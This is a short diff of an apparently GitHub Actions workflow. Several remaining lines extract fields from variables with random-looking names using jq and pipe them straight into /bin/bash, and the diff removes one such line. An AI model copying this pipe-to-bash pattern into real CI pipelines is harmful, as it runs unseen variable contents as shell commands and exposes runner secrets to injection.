@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$jperq7597" | jq -r .frknc68706 | /bin/bash
           printf '%s' "$seqb8" | jq -r .wf756 | /bin/bash
           echo $bhn0 | jq -r .sxywn6862 | /bin/bash
-          echo $cm12947 | jq -r .wlnwi3452 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
